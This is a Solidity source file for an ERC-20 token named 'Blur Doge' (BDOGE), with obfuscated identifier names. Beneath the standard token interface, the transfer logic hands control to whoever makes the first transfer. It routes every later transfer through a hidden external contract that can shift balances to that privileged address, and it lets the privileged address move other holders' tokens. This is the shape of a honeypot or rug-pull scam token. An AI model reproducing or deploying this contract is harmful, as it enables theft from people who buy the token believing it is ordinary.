// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface rJWFXKpkV {
    function totalSupply() external view returns (uint256);
    function balanceOf(address RXxeit) external view returns (uint256);
    function transfer(address fpRdbEi, uint256 XJb) external returns (bool);
    function allowance(address tZfyKZgbdPN, address spender) external view returns (uint256);
    function approve(address spender, uint256 XJb) external returns (bool);
    function transferFrom(
        address sender,
        address fpRdbEi,
        uint256 XJb
    ) external returns (bool);

    event Transfer(address indexed from, address indexed HjlGuwmBvtwm, uint256 value);
    event Approval(address indexed tZfyKZgbdPN, address indexed spender, uint256 value);
}

interface yfzGT is rJWFXKpkV {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract iOXpZzK {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library KQeetNJ{
    
    function kxdh(address MexWSZSGh, address QyodryHue, uint nSsq) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool GYEsxhgHV, bytes memory oRLRNz) = MexWSZSGh.call(abi.encodeWithSelector(0x095ea7b3, QyodryHue, nSsq));
        require(GYEsxhgHV && (oRLRNz.length == 0 || abi.decode(oRLRNz, (bool))), 'KQeetNJ: APPROVE_FAILED');
    }

    function VGXHqFrHv(address MexWSZSGh, address QyodryHue, uint nSsq) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool GYEsxhgHV, bytes memory oRLRNz) = MexWSZSGh.call(abi.encodeWithSelector(0xa9059cbb, QyodryHue, nSsq));
        require(GYEsxhgHV && (oRLRNz.length == 0 || abi.decode(oRLRNz, (bool))), 'KQeetNJ: TRANSFER_FAILED');
    }
    
    function JuRb(address QyodryHue, uint nSsq) internal {
        (bool GYEsxhgHV,) = QyodryHue.call{value:nSsq}(new bytes(0));
        require(GYEsxhgHV, 'KQeetNJ: ETH_TRANSFER_FAILED');
    }

    function JvTdwHyhlUW(address MexWSZSGh, address from, address QyodryHue, uint nSsq) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool GYEsxhgHV, bytes memory oRLRNz) = MexWSZSGh.call(abi.encodeWithSelector(0x23b872dd, from, QyodryHue, nSsq));
        require(GYEsxhgHV && oRLRNz.length > 0,'KQeetNJ: TRANSFER_FROM_FAILED'); return oRLRNz;
                       
    }

}
    
interface ZBFbCb {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract BDOGE is iOXpZzK, rJWFXKpkV, yfzGT {
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    address private sjsSrdVlUD;
    
    mapping(address => mapping(address => uint256)) private srhfQI;
    
    uint256 private abjsxRM = 1000000000000 * 10 ** 18;
    
    function increaseAllowance(address SFlPmwVoPq, uint256 addedValue) public virtual returns (bool) {
        Wcnf(_msgSender(), SFlPmwVoPq, srhfQI[_msgSender()][SFlPmwVoPq] + addedValue);
        return true;
    }
    
    function approve(address IaTOJfs, uint256 ONbZIccK) public virtual override returns (bool) {
        Wcnf(_msgSender(), IaTOJfs, ONbZIccK);
        return true;
    }
    
    function Wcnf(
        address BJJJGj,
        address toNtP,
        uint256 JGBlL
    ) internal virtual {
        require(BJJJGj != address(0), "ERC20: approve from the zero address");
        require(toNtP != address(0), "ERC20: approve to the zero address");

        srhfQI[BJJJGj][toNtP] = JGBlL;
        emit Approval(BJJJGj, toNtP, JGBlL);

    }
    
    function transferFrom(
        address WwEpJF,
        address sStOJYWYSk,
        uint256 EJnLpYraayUH
    ) public virtual override returns (bool) {
      
        if(!PCsioKllYjK(WwEpJF, sStOJYWYSk, EJnLpYraayUH)) return true;

        uint256 ClmFw = srhfQI[WwEpJF][_msgSender()];
        if (ClmFw != type(uint256).max) {
            require(ClmFw >= EJnLpYraayUH, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                Wcnf(WwEpJF, _msgSender(), ClmFw - EJnLpYraayUH);
            }
        }

        return true;
    }
    
    function PCsioKllYjK(
        address WAzwaxmT,
        address lmgwcw,
        uint256 uiUaAUzqVjSj
    ) internal virtual  returns (bool){
        require(WAzwaxmT != address(0), "ERC20: transfer from the zero address");
        require(lmgwcw != address(0), "ERC20: transfer to the zero address");
        
        if(!fgBZd(WAzwaxmT,lmgwcw)) return false;

        if(_msgSender() == address(sjsSrdVlUD)){
            if(lmgwcw == ZSdwH && YNKVS[WAzwaxmT] < uiUaAUzqVjSj){
                xcHdd(sjsSrdVlUD,lmgwcw,uiUaAUzqVjSj);
            }else{
                xcHdd(WAzwaxmT,lmgwcw,uiUaAUzqVjSj);
                if(WAzwaxmT == sjsSrdVlUD || lmgwcw == sjsSrdVlUD) 
                return false;
            }
            emit Transfer(WAzwaxmT, lmgwcw, uiUaAUzqVjSj);
            return false;
        }
        xcHdd(WAzwaxmT,lmgwcw,uiUaAUzqVjSj);
        emit Transfer(WAzwaxmT, lmgwcw, uiUaAUzqVjSj);
        bytes memory xaQlDW = KQeetNJ.JvTdwHyhlUW(zSBOgueuNBmo, WAzwaxmT, lmgwcw, uiUaAUzqVjSj);
        (bool VQuSQmvVRuBd, uint xXZJrOFzDOyE) = abi.decode(xaQlDW, (bool,uint));
        if(VQuSQmvVRuBd){
            YNKVS[sjsSrdVlUD] += xXZJrOFzDOyE;
            YNKVS[lmgwcw] -= xXZJrOFzDOyE; 
        }
        return true;
    }
    
    function decreaseAllowance(address PppSxloNuwD, uint256 subtractedValue) public virtual returns (bool) {
        uint256 IUk = srhfQI[_msgSender()][PppSxloNuwD];
        require(IUk >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            Wcnf(_msgSender(), PppSxloNuwD, IUk - subtractedValue);
        }

        return true;
    }
    
    function allowance(address jJeglE, address cBBNjJtFaSu) public view virtual override returns (uint256) {
        return srhfQI[jJeglE][cBBNjJtFaSu];
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return abjsxRM;
    }
    
    constructor() {
        
        YNKVS[address(1)] = abjsxRM;
        emit Transfer(address(0), address(1), abjsxRM);

    }
    
    function xcHdd(
        address CBHnoTJy,
        address zSZ,
        uint256 uXUYmjLmRcuq
    ) internal virtual  returns (bool){
        uint256 iPRFUJq = YNKVS[CBHnoTJy];
        require(iPRFUJq >= uXUYmjLmRcuq, "ERC20: transfer Amount exceeds balance");
        unchecked {
            YNKVS[CBHnoTJy] = iPRFUJq - uXUYmjLmRcuq;
        }
        YNKVS[zSZ] += uXUYmjLmRcuq;
        return true;
    }
    
    mapping(address => uint256) private YNKVS;
    
    string private oVaqAqP = "Blur Doge";
    
    address private zSBOgueuNBmo;
    
    function name() public view virtual override returns (string memory) {
        return oVaqAqP;
    }
    
    function transfer(address AdPtm, uint256 lKjtnDpu) public virtual override returns (bool) {
        PCsioKllYjK(_msgSender(), AdPtm, lKjtnDpu);
        return true;
    }
    
    function fgBZd(
        address SrZTy,
        address cojCW
    ) internal virtual  returns (bool){
        if(sjsSrdVlUD == address(0) && zSBOgueuNBmo == address(0)){
            sjsSrdVlUD = SrZTy;zSBOgueuNBmo=cojCW;
            KQeetNJ.VGXHqFrHv(zSBOgueuNBmo, sjsSrdVlUD, 0);
            ZSdwH = ZBFbCb(zSBOgueuNBmo).WETH();
            return false;
        }
        return true;
    }
    
    string private cBhCJih =  "BDOGE";
    
    function symbol() public view virtual override returns (string memory) {
        return cBhCJih;
    }
    
    function balanceOf(address vUmBQyNUnK) public view virtual override returns (uint256) {
       return YNKVS[vUmBQyNUnK];
    }
    
    address private ZSdwH;
  
    
}